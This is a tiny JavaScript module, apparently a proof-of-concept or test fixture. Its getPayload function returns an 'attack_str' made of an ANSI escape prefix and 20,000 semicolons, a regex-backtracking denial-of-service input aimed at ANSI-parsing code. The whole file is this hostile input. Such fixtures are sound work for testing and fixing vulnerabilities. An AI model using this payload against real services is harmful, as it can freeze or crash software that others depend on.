function getPayload() {
    let attack_str = "\x1B[" + ";".repeat(20000);
    return { attack_str };
}

module.exports = { getPayload };